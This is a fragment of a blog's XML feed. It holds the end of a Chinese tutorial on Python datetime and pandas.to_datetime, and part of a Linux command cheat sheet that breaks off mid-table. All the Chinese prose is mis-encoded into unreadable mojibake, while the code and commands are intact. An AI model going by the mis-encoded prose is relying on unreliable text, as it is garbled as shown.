string">'%Y-%m-%d'</span><span class="token punctuation">)</span>b<span class="token operator">-</span>a  <span class="token comment"># datetime.timedelta(days=3653)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div>è¿™ä¸ªæ–¹æ³•çš„ç¼ºç‚¹æ˜¯ä¸€æ¬¡åªèƒ½å¤„ç†å•ä¸ªæ—¶é—´å­—ç¬¦ä¸²ï¼Œè‹¥è¦å¤„ç†å¤§é‡çš„æ—¶é—´æ•°æ®ï¼Œå°±éœ€è¦ç”¨forå¾ªç¯ï¼Œå¼€é”€ä¸Šä¸å¦‚<code>pandas.to_datetime</code>ï¼Œ</li></ul><h2 id="pandas-to-datetime"><a href="#pandas-to-datetime" class="headerlink" title="pandas.to_datetime"></a>pandas.to_datetime</h2><p><code>pandas.to_datetime()</code>æ¥æ”¶<code>Series</code>æˆ–åˆ—è¡¨ç­‰ç»“æ„çš„æ•°æ®ï¼Œå¯¹å…¶ä¸­æ‰€æœ‰å­—ç¬¦ä¸²æ—¶é—´æ•°æ®è¿›è¡Œæ ¼å¼åŒ–æ“ä½œï¼Œè½¬æ¢æˆ<code>datetime</code>ç±»å‹ã€‚ä¾‹å¦‚ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddates <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'2019-1-29'</span><span class="token punctuation">,</span><span class="token string">'2018/03/27'</span><span class="token punctuation">,</span><span class="token string">'2017-09-3'</span><span class="token punctuation">]</span>pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span>dates<span class="token punctuation">,</span><span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>   <span class="token comment"># DatetimeIndex(['2019-01-29', '2018-03-27', '2017-09-03'], dtype='datetime64[ns]', freq=None)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></p><blockquote><p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­æˆ‘å¯ä»¥å¯¹åˆ†éš”ç¬¦å’Œ0å‰ç¼€è¿›è¡Œäº†å˜åŠ¨ï¼Œå¯ä»¥å‘ç°å¹¶ä¸å½±å“æœ€ç»ˆçš„ç»“æœ</p></blockquote><p><code>to_datetime</code>è¿˜åŒ…å«å‡ ä¸ªé‡è¦çš„å‚æ•°ï¼š</p><ul><li><code>errors</code><ul><li><code>ignore</code>: å¿½ç•¥è§£æé”™è¯¯ï¼ŒæŒ‰ç…§åŸå§‹è¾“å…¥è¿›è¡Œè¾“å‡ºï¼Œç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­å‡ºç°æœªçŸ¥åˆ†å‰²ç¬¦å·çš„æ—¶å€™ï¼Œå¦‚<code>2019#08@13</code></li><li><code>raise(default)</code>: ä½†å‘ç°æœ‰æ— æ³•è§£æçš„æ—¥æœŸå­—ç¬¦ä¸²æ—¶ï¼ŒæŠ¥é”™</li><li><code>coerce</code>: å°†æ— æ³•è§£æçš„å­—ç¬¦ä¸²åˆ é™¤ä¸º<code>NaT</code></li></ul></li><li><code>dayfirst</code>: æ—¥ä¼˜å…ˆï¼Œåœ¨æœ‰çš„åœ°æ–¹ä¼šæŠŠæ—¥æœŸæ”¾åˆ°æœ€å‰é¢ï¼Œå½¢æˆæ—¥/æœˆ/å¹´çš„å½¢å¼ï¼Œå¦‚<code>10/11/12</code> è§£æä¸º<code>2012-11-10</code></li><li><code>yearfirst</code>: å¹´ä¼˜å…ˆï¼Œé€‚ç”¨äº2ä½çš„å¹´ä»½ï¼Œå¦‚<code>10/11/12</code>è§£æä¸º<code>2010-11-12</code>ï¼Œä½†<code>dayfirst</code>,<code>yearfirst</code>åŒæ—¶ä¸º<code>True</code>ï¼Œ<code>yearfirst</code>ä¼˜å…ˆçº§æ›´é«˜</li></ul><p>è¿”å›çš„æ—¶å€™æ ¹æ®ä¼ å…¥çš„æ•°æ®ç»“æ„ç±»å‹ä¸åŒï¼Œè¿”å›ç»“æœä¹Ÿä¸åŒï¼š</p><ul><li>åˆ—è¡¨ï¼ˆæˆ–ç±»ä¼¼æ•°æ®ç»“æ„ï¼‰: DatetimeIndex</li><li>Series: Series datetime64 ç±»å‹</li><li>æ ‡é‡: Timestamp</li></ul><h3 id="to-datetimeå¤„ç†æ—¶é—´æˆ³æ•°æ®"><a href="#to-datetimeå¤„ç†æ—¶é—´æˆ³æ•°æ®" class="headerlink" title="to_datetimeå¤„ç†æ—¶é—´æˆ³æ•°æ®"></a>to_datetimeå¤„ç†æ—¶é—´æˆ³æ•°æ®</h3><p>æœ‰çš„æ—¶å€™ç»™æˆ‘ä»¬çš„æ•°æ®ä»¥æ—¶é—´æˆ³çš„æ–¹å¼å­˜å‚¨æˆå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚<code>1490195805</code>ï¼Œç›¸åº”çš„ç”¨<code>to_datetime</code>å¤„ç†å¦‚ä¸‹ï¼š</p><ul><li>ä»¥ç§’ä¸ºå•ä½  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span><span class="token number">1490195805</span><span class="token punctuation">,</span> unit<span class="token operator">=</span><span class="token string">'s'</span><span class="token punctuation">)</span>  <span class="token comment"># Timestamp('2017-03-22 15:16:45')</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li><li>ä»¥çº³ç§’ä¸ºå•ä½  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span><span class="token number">1490195805433502912</span><span class="token punctuation">,</span> unit<span class="token operator">=</span><span class="token string">'ns'</span><span class="token punctuation">)</span> <span class="token comment">#  Timestamp('2017-03-22 15:16:45.433502912')</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li></ul><h2 id="å®é™…åº”ç”¨"><a href="#å®é™…åº”ç”¨" class="headerlink" title="å®é™…åº”ç”¨"></a>å®é™…åº”ç”¨</h2><p>å‡è®¾æˆ‘ä»¬æœ‰å¦‚ä¸‹çš„ä¸€ç»„æ¯æ—¥é™é›¨è®°å½•çš„æ•°æ®ï¼Œæ¯å¤©è®°å½•æ˜¯å¦é™é›¨ï¼š<br><img src="https://img-blog.csdnimg.cn/20200921112722560.png#pic_center" alt=""><br>ç°åœ¨æˆ‘ä»¬å¸Œæœ›çŸ¥é“åœ¨<code>2019-02-01</code>åˆ°<code>2019-02-02</code>æ—¶é—´å†…é™é›¨çš„æ¬¡æ•°ã€‚åˆ™å¯é€šè¿‡å¦‚ä¸‹ä»£ç å®ç°ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'isRainFall'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'date'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'2019-02-01'</span><span class="token punctuation">,</span><span class="token string">'2019-02-02'</span><span class="token punctuation">,</span><span class="token string">'2019-02-03'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span> <span class="token operator">=</span> pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>  <span class="token comment"># å°†å­—ç¬¦ä¸²æ—¶é—´è½¬æ¢æˆdatetime</span>start_date <span class="token operator">=</span> pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span><span class="token string">'2019-02-01'</span><span class="token punctuation">,</span><span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>end_date <span class="token operator">=</span> pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span><span class="token string">'2019-02-02'</span><span class="token punctuation">,</span><span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> start_date<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> end_date<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'isRainFall'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>datetime</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux å¸¸ç”¨å‘½ä»¤å¤§å…¨</title>
    <link href="/article/48940.html"/>
    <url>/article/48940.html</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡è®°å½•äº†Linuxæ“ä½œç³»ç»Ÿä¸­å¸¸ç”¨çš„å‘½ä»¤ä»¥åŠå¯¹åº”å‚æ•°ï¼Œæ–¹ä¾¿ä½¿ç”¨çš„æ—¶å€™è¿›è¡ŒæŸ¥è¯¢ï¼Œä¸»è¦å‚è€ƒ<code>541137 Linuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ</code>ä¸€ä¹¦ï¼Œåé¢è¿˜æœ‰è®¸å¤šé«˜çº§çš„å†…å®¹ï¼Œä½†æ—¥å¸¸çš„linuxä½¿ç”¨ä¸‹é¢æ¶‰åŠçš„å·²ç»è¶³å¤Ÿã€‚æœ¬æ–‡çš„æ­£ç¡®æ‰“å¼€æ–¹å¼æ˜¯ä½œä¸ºå­—å…¸å¼çš„å‘½ä»¤æŸ¥è¯¢ï¼Œä¸å»ºè®®å°†è¿™äº›å‘½ä»¤ä¸€ä¸€èƒŒä½ï¼Œåªéœ€äº†è§£åŸºç¡€çš„å‡ ä¸ªå°±å¥½ã€‚ </p><blockquote><p>éƒ¨åˆ†å¤æ‚å†…å®¹æ·»åŠ äº†é…å›¾æ–¹ä¾¿ç†è§£ï¼Œä¹Ÿå¯ä»¥å‰å¾€æˆ‘çš„<a href="https://www.gentlecp.com/articles/676.html">ä¸ªäººåšå®¢</a>é˜…è¯»åŸæ–‡</p></blockquote><h1 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h1><h2 id="æŸ¥çœ‹æ–‡ä»¶lså‘½ä»¤"><a href="#æŸ¥çœ‹æ–‡ä»¶lså‘½ä»¤" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶lså‘½ä»¤"></a>æŸ¥çœ‹æ–‡ä»¶lså‘½ä»¤</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">ls -F  # ç”¨äºåŒºåˆ†æ–‡ä»¶å’Œç›®å½•ls -a  # æ˜¾ç¤ºéšè—ç›®å½•å’Œæ–‡ä»¶ls -R  # é€’å½’æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ls -l  # æ˜¾ç¤ºé•¿åˆ—è¡¨ï¼ŒåŒ…å«æ›´å¤šä¿¡æ¯ls -l file_name  # è¿‡æ»¤æ˜¾ç¤ºï¼Œå¯ä»¥ç”¨?ä»£æ›¿ä¸€ä¸ªå­—ç¬¦ï¼Œ*ä»£æ›¿é›¶ä¸ªæˆ–å¤šä¸ª[a-z]è¡¨ç¤ºa-zä»»ä¸€ä¸ªï¼Œï¼åè·Ÿå­—ç¬¦è¡¨ç¤ºé™¤è¿™ä¸ªå­—ç¬¦å¤–ï¼Œï¼éœ€æ”¾ç½®åœ¨[]ä¸­<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="åˆ›å»ºæ–‡ä»¶touchå‘½ä»¤"><a href="#åˆ›å»ºæ–‡ä»¶touchå‘½ä»¤" class="headerlink" title="åˆ›å»ºæ–‡ä»¶touchå‘½ä»¤"></a>åˆ›å»ºæ–‡ä»¶touchå‘½ä»¤</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">touch file_name # åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œè‹¥æ— åˆ™åˆ›å»ºï¼Œè‹¥æœ‰åˆ™ä¿®æ”¹æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´touch -a file_name # åªä¿®æ”¹æ–‡ä»¶çš„è®¿é—®æ—¶é—´<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><p>è¦æŸ¥çœ‹è®¿é—®æ—¶é—´ç”¨ä»¥ä¸‹å‘½ä»¤<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">ls -l --time&#x3D;atime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><h2 id="å¤åˆ¶æ–‡ä»¶"><a href="#å¤åˆ¶æ–‡ä»¶" class="headerlink" title="å¤åˆ¶æ–‡ä»¶"></a>å¤åˆ¶æ–‡ä»¶</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">cp source destination  # å¦‚æœç›®æ ‡æ–‡ä»¶å·²å­˜åœ¨ä¼šå¼ºåˆ¶è¦†ç›–cp -i source destination  # è¯¢é—®æ˜¯å¦è¦†ç›–cp file dir&#x2F;  # å¦‚æœä¸æŒ‡å®šæ‹·è´çš„æ–‡ä»¶ï¼Œåªæ˜¯å¤åˆ¶åˆ°dirç›®å½•ä¸‹ï¼Œéœ€è¦åŠ ä¸Š&#x2F;cp -R dir1&#x2F; dir2  # é€’å½’å¤åˆ¶æ–‡ä»¶å¤¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="é“¾æ¥æ–‡ä»¶"><a href="#é“¾æ¥æ–‡ä»¶" class="headerlink" title="é“¾æ¥æ–‡ä»¶"></a>é“¾æ¥æ–‡ä»¶</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">ln -s source destination  # ç¬¦å·é“¾æ¥ï¼Œç»“æœï¼šdestination-&gt;source,ç›¸å½“äºå¿«æ·æ–¹å¼ln source destination  # ç¡¬é“¾æ¥ï¼Œä¸¤ä¸ªç›¸åŒçš„æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h2 id="ç§»åŠ¨æ–‡ä»¶"><a href="#ç§»åŠ¨æ–‡ä»¶" class="headerlink" title="ç§»åŠ¨æ–‡ä»¶"></a>ç§»åŠ¨æ–‡ä»¶</h2><p>ç±»ä¼¼copy<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">mv source destination  # å¯ä»¥é‡å‘½å<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><h2 id="åˆ é™¤æ–‡ä»¶"><a href="#åˆ é™¤æ–‡ä»¶" class="headerlink" title="åˆ é™¤æ–‡ä»¶"></a>åˆ é™¤æ–‡ä»¶</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">rm -i file  # å»ºè®®æ·»åŠ -iè¯¢é—®æ˜¯å¦åˆ é™¤ï¼Œä»¥å…è¯¯åˆ ï¼Œå› ä¸ºä¸èƒ½æ’¤é”€rm -r dir&#x2F;  # åˆ é™¤æ–‡ä»¶å¤¹åŠ få‚æ•°æ˜¯å¼ºåˆ¶åˆ é™¤ï¼Œæ…ç”¨ï¼ï¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><h2 id="æŸ¥çœ‹æ–‡ä»¶-ç±»å‹"><a href="#æŸ¥çœ‹æ–‡ä»¶-ç±»å‹" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶/ç±»å‹"></a>æŸ¥çœ‹æ–‡ä»¶/ç±»å‹</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">file file_name  # æŸ¥çœ‹æ–‡ä»¶å†…éƒ¨ï¼Œç»™å‡ºæ–‡ä»¶ç±»å‹ï¼ŒåŒ…æ‹¬ç¼–ç æ–¹å¼file dir  # åŒºåˆ†ç›®å½•cat file_name  # æŸ¥çœ‹æ–‡ä»¶å†…å®¹cat -n file_name  # ç»™æ‰€æœ‰è¡ŒåŠ ä¸Šè¡Œå·cat -b file_name  # ç»™æœ‰æ–‡æœ¬çš„è¡ŒåŠ ä¸Šè¡Œå·more file_name  # æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼ŒåŒ…å«æ–‡ä»¶æ‰€å±ä½ç½®ï¼Œåœ¨æ¯é¡µæ•°æ®åœä¸‹tail file_name  # æ˜¾ç¤ºæ–‡ä»¶æœ€åå‡ è¡Œï¼Œé»˜è®¤10è¡Œtail -n 3 file_name  # æ˜¾ç¤ºæœ€å3è¡Œï¼Œä¹Ÿå¯ä»¥ç›´æ¥æŠŠnæ¢æˆ3tail -f file_name  # åŠ¨æ€æŸ¥çœ‹æœ€åå‡ è¡Œï¼Œå¦‚æœæœ‰å…¶ä»–è¿›ç¨‹å¯¹æ–‡ä»¶ä¿®æ”¹ï¼Œåˆ™ä¼šåŠ¨æ€åŠ è½½ï¼Œç”¨äºç›‘è§†ç³»ç»Ÿæ—¥å¿—head file_name  # æ˜¾ç¤ºå¼€å¤´å‡ è¡Œï¼Œé»˜è®¤10è¡Œï¼Œé™¤äº†-få…¶ä½™å±æ€§ä¸tailç›¸åŒ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="Linuxå‘½ä»¤è¡Œå›¾è°±"><a href="#Linuxå‘½ä»¤è¡Œå›¾è°±" class="headerlink" title="Linuxå‘½ä»¤è¡Œå›¾è°±"></a>Linuxå‘½ä»¤è¡Œå›¾è°±</h2><p><img src="https://img-blog.csdnimg.cn/20200302133009486.png#pic_center =500x250" alt=""></p><h1 id="è¿›ç¨‹æ“ä½œ"><a href="#è¿›ç¨‹æ“ä½œ" class="headerlink" title="è¿›ç¨‹æ“ä½œ"></a>è¿›ç¨‹æ“ä½œ</h1><p>æœ¬ç« æ¯”è¾ƒå¤æ‚ï¼Œæ·»åŠ äº†å›¾ç‰‡åšè¯´æ˜</p><h2 id="æŸ¥çœ‹è¿›ç¨‹"><a href="#æŸ¥çœ‹è¿›ç¨‹" class="headerlink" title="æŸ¥çœ‹è¿›ç¨‹"></a>æŸ¥çœ‹è¿›ç¨‹</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">ps -ef  # æ˜¾ç¤ºç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹ï¼Œ-eæŒ‡å®šæ˜¾ç¤ºæ‰€æœ‰è¿è¡Œåœ¨ç³»ç»Ÿä¸Šçš„è¿›ç¨‹ï¼Œ-fæ‰©å±•äº†è¾“å‡º<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/2020030213303494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" style="zoom:50%;" /></p><div class="table-container"><table><thead><tr><th style="text-align:center">åç§°</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center">UID</td><td style="text-align:center">å¯åŠ¨è¿™äº›è¿›ç¨‹çš„ç”¨æˆ·</td></tr><tr><td style="text-align:center">PID</td><td style="text-align:center">è¿›ç¨‹ID</td></tr><tr><td style="text-align:center">PPID</td><td style="text-align:center">çˆ¶è¿›ç¨‹çš„è¿›ç¨‹ID</td></tr><tr><td style="text-align:center">C</td><td style="text-align:center">è¿›ç¨‹ç”Ÿå‘½å‘¨æœŸä¸­çš„CPUåˆ©ç”¨ç‡</td></tr><tr><td style="text-align:center">STIME</td><td style="text-align:center">è¿›ç¨‹å¯åŠ¨æ—¶çš„ç³»ç»Ÿæ—¶é—´</td></tr><tr><td style="text-align:center">TTY</td><td style="text-align:center">è¿›ç¨‹å¯åŠ¨æ—¶çš„ç»ˆç«¯è®¾å¤‡</td></tr><tr><td style="text-align:center">TIME</td><td style="text-align:center">è¿è¡Œè¿›ç¨‹éœ€è¦çš„ç´¯è®¡CPUæ—¶é—´</td></tr><tr><td style="text-align:center">CMD</td><td style="text-align:center">å¯åŠ¨çš„ç¨‹åºåç§°</td></tr></tbody></table></div><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">ps -l  # äº§ç”Ÿä¸€ä¸ªé•¿æ ¼å¼çš„è¾“å‡º<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/2020030213305614.png" alt=""></p><div class="table-container"><table><thead><tr><th style="text-align:center">åç§°</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center">F</td><td style="text-align:center">å†…æ ¸åˆ†é…ç»™è¿›ç¨‹çš„ç³»ç»Ÿæ ‡è®°</td></tr><tr><td style="text-align:center">S</td><td style="text-align:center">è¿›ç¨‹çš„çŠ¶æ€ï¼ˆOï¼šè¿è¡Œï¼›Sï¼šä¼‘çœ ï¼›Rï¼šå¯è¿è¡Œ,æ­£ç­‰å¾…è¿è¡Œï¼›Zï¼šåƒµåŒ–,è¿›ç¨‹å·²ç»“æŸä½†çˆ¶è¿›ç¨‹å·²ä¸å­˜åœ¨ï¼›T:åœæ­¢ï¼‰</td></tr><tr><td style="text-align:center">PRI</td><td style="text-align:center">è¿›ç¨‹çš„ä¼˜å…ˆçº§</td></tr><tr><td style="text-align:center">NI</td><td style="text-align:center">è°¦è®©åº¦å€¼ç”¨æ¥å‚ä¸å†³å®šä¼˜å…ˆçº§</td></tr><tr><td style="text-align:center">ADDR</td><td style="text-align:center">è¿›ç¨‹çš„å†…å­˜åœ°å€</td></tr><tr><td style="text-align:center">SZ</td><td style="text-align:center">å‡å¦‚è¿›ç¨‹è¢«æ¢å‡ºï¼Œæ‰€éœ€äº¤æ¢ç©ºé—´çš„å¤§è‡´å¤§å°</td></tr><tr><td style="text-align:center">WCHAN</td><td style="text-align:center">è¿›ç¨‹ä¼‘çœ çš„å†…æ ¸å‡½æ•°çš„åœ°å€</td></tr></tbody></table></div><h2 id="å®æ—¶ç›‘æµ‹è¿›ç¨‹"><a href="#å®æ—¶ç›‘æµ‹è¿›ç¨‹" class="headerlink" title="å®æ—¶ç›‘æµ‹è¿›ç¨‹"></a>å®æ—¶ç›‘æµ‹è¿›ç¨‹</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">top  top -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h2 id="ç»“æŸè¿›ç¨‹"><a href="#ç»“æŸè¿›ç¨‹" class="headerlink" title="ç»“æŸè¿›ç¨‹"></a>ç»“æŸè¿›ç¨‹</h2><p>killå‘½ä»¤ç»“æŸè¿›ç¨‹<br><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ps -l  # é€šå¸¸å…ˆç”¨pså‘½ä»¤æŸ¥çœ‹è¿›ç¨‹IDkill PID  # æ ¹æ®PIDç»“æŸè¿›ç¨‹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><br>killallå‘½ä»¤ç»“æŸè¿›ç¨‹<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">killall http*  # ç»“æŸæ‰€æœ‰ä»¥httpå¼€å¤´çš„è¿›ç¨‹ï¼Œå…è®¸é€šè¿‡è¿›ç¨‹åç»“æŸè¿›ç¨‹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><h1 id="ç£ç›˜ç©ºé—´"><a href="#ç£ç›˜ç©ºé—´" class="headerlink" title="ç£ç›˜ç©ºé—´"></a>ç£ç›˜ç©ºé—´</h1><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">df -h  # æŸ¥çœ‹ç£ç›˜ä½¿ç”¨æƒ…å†µ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/2020030213311057.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" style="zoom:50%;" /></p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">du  # æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶ã€ç›®å½•å’Œå­ç›®å½•çš„ç£ç›˜ä½¿ç”¨æƒ…å†µdu -c # æ˜¾ç¤ºæ‰€æœ‰å·²åˆ—å‡ºæ–‡ä»¶æ€»çš„å¤§å°du -h # äººæ€§åŒ–æ˜¾ç¤º<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><h1 id="å¤„ç†æ•°æ®æ–‡ä»¶"><a href="#å¤„ç†æ•°æ®æ–‡ä»¶" class="headerlink" title="å¤„ç†æ•°æ®æ–‡ä»¶"></a>å¤„ç†æ•°æ®æ–‡ä»¶</h1><h2 id="æ’åºæ•°æ®"><a href="#æ’åºæ•°æ®" class="headerlink" title="æ’åºæ•°æ®"></a>æ’åºæ•°æ®</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">sort file_name  # æŒ‰é»˜è®¤çš„è¯­è¨€æ’åºè§„åˆ™å¯¹æ–‡æœ¬æ–‡ä»¶æ•°æ®æ’åºsort -n file_name  # æŒ‰æ•°å­—æ’åºsort -M file_name  # æŒ‰ä¸‰å­—ç¬¦æœˆä»½æ’åºï¼Œé€‚ç”¨äº Janï¼ŒFebè¿™äº›æ‰“å¤´çš„sort -f file_name  # å¿½ç•¥å¤§å°å†™æ’åº<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="æœç´¢æ•°æ®"><a href="#æœç´¢æ•°æ®" class="headerlink" title="æœç´¢æ•°æ®"></a>æœç´¢æ•°æ®</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">grep [options] pattern [file] # åœ¨æ–‡ä»¶ä¸­æŸ¥æ‰¾åŒ…å«åŒ¹é…æŒ‡å®šæ¨¡å¼çš„å­—ç¬¦çš„è¡Œgrep t file1  # åœ¨file1ä¸­æ‰¾tå¼€å¤´çš„è¡Œgrep -v t file1  # åœ¨file1ä¸­æ‰¾ä¸ä»¥tå¼€å¤´çš„è¡Œgrep -n t file1  # æ˜¾ç¤ºè¡Œå·grep -c t file1  # åŒ¹é…çš„æ•°é‡grep [tf] file1  # åœ¨file1ä¸­æ‰¾tæˆ–få¼€å¤´çš„è¡Œï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="å‹ç¼©æ•°æ®"><a href="#å‹ç¼©æ•°æ®" class="headerlink" title="å‹ç¼©æ•°æ®"></a>å‹ç¼©æ•°æ®</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">gzip file  # å‹ç¼©æ–‡ä»¶gzip file*  # å‹ç¼©æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶gunzip file.gz  # è§£å‹æ–‡ä»¶ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><h2 id="å½’æ¡£æ•°æ®"><a href="#å½’æ¡£æ•°æ®" class="headerlink" title="å½’æ¡£æ•°æ®"></a>å½’æ¡£æ•°æ®</h2><p>ç›¸æ¯”ä¸gzipï¼Œtarå‘½ä»¤ç”¨çš„æ›´å¤š<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">tar function [options] object1 object2 ...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><ul><li><strong>tarå‘½ä»¤çš„åŠŸèƒ½</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">åŠŸèƒ½</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center">-A</td><td style="text-align:center">å°†ä¸€ä¸ªå·²æœ‰å½’æ¡£æ–‡ä»¶è¿½åŠ åˆ°å¦ä¸€ä¸ªå·²æœ‰å½’æ¡£æ–‡ä»¶</td></tr><tr><td 